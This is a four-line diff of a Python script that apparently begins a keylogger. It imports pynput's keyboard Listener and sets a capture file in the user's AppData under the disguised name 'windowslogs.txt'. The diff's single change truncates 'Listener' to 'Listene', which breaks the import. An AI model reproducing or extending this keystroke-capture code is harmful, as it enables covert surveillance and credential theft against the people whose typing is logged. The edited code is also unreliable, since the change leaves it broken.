@@ -1,4 +1,4 @@
-from pynput.keyboard import Key,Listener
+from pynput.keyboard import Key,Listene
 import os
 
 kg_file = os.environ["appdata"]+"\\windowslogs.txt"
